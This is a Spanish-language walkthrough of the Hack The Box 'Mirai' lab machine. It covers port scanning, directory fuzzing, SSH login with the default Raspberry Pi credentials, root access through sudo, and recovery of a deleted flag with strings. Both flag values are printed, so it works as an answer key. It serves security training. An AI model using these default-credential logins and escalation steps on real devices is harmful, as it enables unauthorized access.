@@ -1,0 +1,247 @@
+-----------------
+[ MIRAI MACHINE ]
+-----------------
+
+# Notas sobre la resolución de la máquina MIRAI por FeathersMcgr4w
+
+[GITHUB]: https://github.com/FeathersMcgr4w/
+
+[Lets Start!]
+
+-----
+| 1 | Ejecutamos un ping para verificar si esta activa la maquina victima --> ping -c 1 10.10.10.48
+-----
+		-> ping -c 1 10.10.10.48 -R  (Trace Route)
+
+		[*] ttl: 63 (Linux) => Linux (ttl=64) | Windows (ttl=128)
+
+
+-----
+| 2 | Escaneo rápido de Puertos con NMAP
+-----
+
+└─$ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.10.48 -oG allPorts
+
+Puertos Abiertos:
+
+        [*] Open ports: 22, 53, 80, 1612, 32400, 32469
+
+
+
+-----
+| 3 | Obtener información detallada con NMAP:
+-----
+
+(scripts de reconocimiento y exportar en formato nmap)
+
+locate .nse | xargs grep "categories" | grep -oP '".*?"' | tr -d '"' | sort -u (scripts de reconocimiento)
+
+
+└─# nmap -sCV -p22,80 10.10.11.11 -oN targeted
+
+
+
+-----
+| 4 | Realizamos un curl solo cabezeras
+-----
+
+└─$ curl -sX GET "http://10.10.10.48" -I                                                                       
+
+HTTP/1.1 404 Not Found
+X-Pi-hole: A black hole for Internet advertisements.
+Content-type: text/html; charset=UTF-8
+Content-Length: 0
+Date: Mon, 14 Oct 2024 15:10:48 GMT
+Server: lighttpd/1.4.35
+
+
+[i] Detectamos que hay una Raspberry Pi-hole (ad blocker)
+
+-[ NOTA ]: default SSH username is "pi" and the default password: "raspberry".
+
+
+
+-----
+| 5 |  Fuzzeamos con wfuzz
+-----
+
+└─$ wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.48/FUZZ
+
+	 wfuzz : ejecutar herramienta wfuzz
+
+     -c : activar salida de colores en la terminal.
+
+     --hc=404 : wfuzz ignorara las respuestas http con código de estado 404
+
+     -t 200 : usar 200 hilos de ejecución en paralelo ( 200 consultas en paralelo )
+
+     -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt : diccionario que utiliza wfuzz
+
+     http://10.10.10.48/FUZZ : URL objetivo + "FUZZ" marca la posición donde coloca el diccionario
+
+
+-[ RESULTADOS ]:
+
+000000259:   301        0 L      0 W        0 Ch        "admin"                                                                                                                     
+000004238:   200        0 L      1 W        18 Ch       "versions"
+
+
+-[ NOTA ]: Encontramos un panel de admin
+
+
+
+-----
+| 6 | Accedemos por SSH
+-----
+
+>> Con user: pi@10.10.10.48
+>> pass: raspberry
+
+
+
+-----
+| 7 | Verificamos comando id
+-----
+
+pi@raspberrypi:~ $ id
+uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),117(i2c),998(gpio),999(spi)
+
+
+-[ NOTA ]: estamos dentro del grupo "sudo" --> 27(sudo)
+
+			Si un usuario pertenece al grupo sudo, puede ejecutar comandos con privilegios de superusuario (root).
+			
+			Podemos ejecutar el comando "sudo su" para rootear
+
+
+pi@raspberrypi:~ $ sudo su
+
+root@raspberrypi:/home/pi# whoami
+root
+
+
+
+-[ 1° FLAG ]
+
+root@raspberrypi:/home/pi# cd Desktop
+
+root@raspberrypi:/home/pi/Desktop# ls -l
+total 8
+drwxr-xr-x 4 pi pi 4096 Aug 13  2017 Plex
+-rw-r--r-- 1 pi pi   32 Aug 13  2017 user.txt
+
+root@raspberrypi:/home/pi/Desktop# cat user.txt
+ff837707441b257a20e32199d7c8838d
+
+
+
+-----
+| 8 | Buscamos los dispositivos USB en la máquina
+-----
+
+1. Primeramente listamos dispositivos USB [ lsusb ]
+
+	root@raspberrypi:/home/pi/Desktop# lsusb
+	Bus 002 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub
+	Bus 001 Device 003: ID 0e0f:0002 VMware, Inc. Virtual USB Hub <--* TARGET *-->
+	Bus 001 Device 002: ID 0e0f:0003 VMware, Inc. Virtual Mouse
+	Bus 001 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub
+
+
+2. Otra forma de identifocar dispositivo USB [ lsblk ]
+
+	root@raspberrypi:/home/pi/Desktop# lsblk
+	NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
+	sda      8:0    0   10G  0 disk 
+	├─sda1   8:1    0  1.3G  0 part /lib/live/mount/persistence/sda1
+	└─sda2   8:2    0  8.7G  0 part /lib/live/mount/persistence/sda2
+	sdb      8:16   0   10M  0 disk /media/usbstick				<--* TARGET *-->
+	sr0     11:0    1 1024M  0 rom  
+	loop0    7:0    0  1.2G  1 loop /lib/live/mount/rootfs/filesystem.squashfs
+
+Los pendrive normalmente se identifica como: /dev/sdb o /dev/sdc
+
+
+3. Ver dispositivo montado en el sistema [ df -h ]
+
+	Comando "df -h" --> mostrar espacio en disco disponible y usado en los sistemas de archivos montados.
+
+	* 'df' : "disk free", muestra info sobre el espacio en disco
+
+	* '-h' : "human-readable", formato en tamaño kb, mb, gb
+
+
+root@raspberrypi:/home/pi/Desktop# df -h
+Filesystem      Size  Used Avail Use% Mounted on
+aufs            8.5G  2.8G  5.3G  34% /
+tmpfs           100M  4.8M   96M   5% /run
+/dev/sda1       1.3G  1.3G     0 100% /lib/live/mount/persistence/sda1
+/dev/loop0      1.3G  1.3G     0 100% /lib/live/mount/rootfs/filesystem.squashfs
+tmpfs           250M     0  250M   0% /lib/live/mount/overlay
+/dev/sda2       8.5G  2.8G  5.3G  34% /lib/live/mount/persistence/sda2
+devtmpfs         10M     0   10M   0% /dev
+tmpfs           250M  8.0K  250M   1% /dev/shm
+tmpfs           5.0M  4.0K  5.0M   1% /run/lock
+tmpfs           250M     0  250M   0% /sys/fs/cgroup
+tmpfs           250M  8.0K  250M   1% /tmp
+/dev/sdb        8.7M   93K  7.9M   2% /media/usbstick			<--* TARGET *-->
+tmpfs            50M     0   50M   0% /run/user/999
+tmpfs            50M     0   50M   0% /run/user/1000
+
+
+
+-----
+| 9 | Buscamos el archivo
+-----
+
+root@raspberrypi:/home/pi/Desktop# cd /media/usbstick
+
+root@raspberrypi:/media/usbstick# cat damnit.txt
+Damnit! Sorry man I accidentally deleted your files off the USB stick.
+Do you know if there is any way to get them back?
+
+-James
+
+LOS ARCHIVOS SE BORRARON POR ACCIDENTE!!!
+
+
+
+------
+| 10 | Analisis forense
+------
+
+Con el comando 'strings /dev/sdb' podemos extraer y mostrar cadenas de texto legibles desde el dispositivo (pendrive, disco duro) o archivo (binarios).
+
+	'strings' : busca secuencia de caracteres imprimibles dentro de un binario o dispositivo.
+
+	'/dev/sdb' : dispositivo de almacenamiento
+
+
+Ejecucuión de comando:
+
+root@raspberrypi:/media/usbstick# strings /dev/sdb
+>r &
+/media/usbstick
+lost+found
+root.txt
+damnit.txt
+>r &
+>r &
+/media/usbstick
+lost+found
+root.txt
+damnit.txt
+>r &
+/media/usbstick
+2]8^
+lost+found
+root.txt
+damnit.txt
+>r &
+3d3e483143ff12ec505d026fa13e020b								<--* FLAG *--> 
+Damnit! Sorry man I accidentally deleted your files off the USB stick.
+Do you know if there is any way to get them back?
+-James
+
+
+
